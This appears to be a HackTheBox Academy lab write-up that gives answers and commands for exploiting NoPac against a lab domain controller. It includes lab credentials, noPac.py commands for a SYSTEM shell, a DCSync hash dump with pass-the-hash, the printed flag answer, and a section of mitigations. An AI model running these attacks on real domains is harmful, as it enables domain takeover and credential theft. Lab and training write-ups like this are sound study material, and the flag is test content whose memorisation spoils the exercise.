# 🛰️ HTB Academy Lab Solutions

## 🔍 Lab Environment Details

- **Attack Host**: ATTACK01 (SSH access with `htb-student:HTB_@cademy_stdnt!`)
- **Target Domain**: INLANEFREIGHT.LOCAL
- **Domain Controller**: 172.16.5.5
- **Available Credentials**: `forend:Klmcargo2`

## 🎯 Question 1: "Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)"

### [!ABSTRACT]
Based on the NoPac vulnerability documentation and attack methodology:

**Answer:** `2021-42278&2021-42287`

**Explanation:**
- **CVE-2021-42278**: Security Account Manager (SAM) bypass vulnerability allowing SamAccountName manipulation.
- **CVE-2021-42287**: Kerberos Privilege Attribute Certificate (PAC) vulnerability in ADDS enabling privilege escalation.

## 🚀 Question 2: "Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop."

### [!INFO]
#### **Complete Solution Walkthrough**

**Step 1: SSH to Attack Host**
```bash
# Connect to ATTACK01
ssh htb-student@<target-ip>
# Password: HTB_@cademy_stdnt!
```

**Step 2: Navigate to NoPac Directory**
```bash
# Change to NoPac exploit directory
cd /opt/noPac
```

**Step 3: Scan for Vulnerability**
```bash
# Test if target is vulnerable to NoPac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

**Step 4: Execute NoPac for Shell Access**
```bash
# Obtain SYSTEM shell on Domain Controller
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

**Step 5: Navigate to Flag Location**
```cmd
# From semi-interactive shell, navigate to Administrator desktop
C:\Windows\system32> cd C:\Users\Administrator\Desktop\DailyTasks
C:\Users\Administrator\Desktop\DailyTasks> dir
C:\Users\Administrator\Desktop\DailyTasks> type flag.txt
```

**Alternative Method - DCSync Approach:**
```bash
# Use NoPac for DCSync instead of shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

# Use extracted administrator hash for authentication
crackmapexec smb 172.16.5.5 -u administrator -H <extracted_hash>
```

**Step 5: Flag Retrieval**
```cmd
# Navigate to flag location and display contents
C:\Windows\system32> type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
D0ntSl@ckonN0P@c!
```

### [!SUCCESS]
**Answer:** `D0ntSl@ckonN0P@c!`

---

## 🛡️ Defensive Measures and Mitigations

### **NoPac Mitigations**

#### [!INFO] Immediate Actions
```powershell
# Set ms-DS-MachineAccountQuota to 0 (prevents machine account addition)
Set-ADDomain -Identity "DC=inlanefreight,DC=local" -MachineAccountQuota 0

# Monitor for suspicious machine account creation
Get-ADComputer -Filter {Created -gt (Get-Date).AddDays(-1)} -Properties Created | Select Name, Created
```

#### [!INFO] Long-term Hardening
- **Patch Management**: Apply CVE-2021-42278 and CVE-2021-42287 patches.
- **Account Monitoring**: Monitor for unusual computer account creation patterns.
- **Privilege Reviews**: Regular review of accounts with machine creation rights.
- **Detection Rules**: Implement SIEM rules for SamAccountName modifications.

### **PrintNightmare Mitigations**

#### [!INFO] Service Hardening
```powershell
# Disable Print Spooler service on non-print servers
Stop-Service -Name "Spooler" -Force
Set-Service -Name "Spooler" -StartupType Disabled

# Remove unnecessary print drivers
Remove-PrinterDriver -Name "Generic / Text Only" -Force
```

#### [!INFO] Group Policy Configuration
- **Print Driver Installation**: Restrict driver installation to administrators only.
- **Point and Print**: Disable point and print functionality via GPO.
- **Package Point and Print**: Configure secure package point and print settings.

### **PetitPotam Mitigations**

#### [!INFO] Certificate Services Hardening
```powershell
# Enable Extended Protection for Authentication
# Configure Certificate Authority Web Enrollment for HTTPS only
# Disable NTLM authentication for Domain Controllers
```

#### [!INFO] Network Controls
- **NTLM Relay Protection**: Implement SMB signing and channel binding.
- **Certificate Template Security**: Review and harden certificate templates.
- **Network Segmentation**: Isolate Certificate Authority from general network.
- **LDAP Authentication**: Use Kerberos instead of NTLM where possible.

---

## 📊 Key Takeaways

### [!ABSTRACT] Technical Mastery Achieved
1. **Bleeding Edge Exploitation**: Proficiency with latest AD attack vectors.
2. **Multi-Vector Attacks**: Understanding of various domain compromise paths.
3. **Certificate Abuse**: Advanced PKI and ADCS exploitation techniques.
4. **Tool Proficiency**: Mastery of NoPac, PrintNightmare, and PetitPotam tools.

### [!ABSTRACT] Professional Skills Developed
- **Rapid Adaptation**: Ability to quickly implement new attack techniques.
- **Risk Assessment**: Understanding impact and exploitability of recent vulnerabilities.
- **Client Communication**: Effectively explaining cutting-edge threats to stakeholders.
- **Patch Prioritization**: Identifying critical vulnerabilities requiring immediate attention.

### [!ABSTRACT] Attack Methodology Mastery
```
Vulnerability Research → Tool Setup → Target Assessment → Exploitation → Domain Compromise
    (CVE Analysis)      (Environment)   (Scanning)       (Execution)    (Full Control)
```

### [!ABSTRACT] Defensive Insights
- **Patch Management**: Critical importance of timely security updates.
- **Attack Surface Reduction**: Disabling unnecessary services and features.
- **Monitoring Requirements**: Detection strategies for advanced persistent threats.
- **Incident Response**: Rapid containment procedures for domain compromise.

**🔑 Complete mastery of bleeding edge Active Directory vulnerabilities - from theoretical understanding through practical exploitation to defensive implementation - representing cutting-edge enterprise penetration testing capabilities for the most current threat landscape!**

---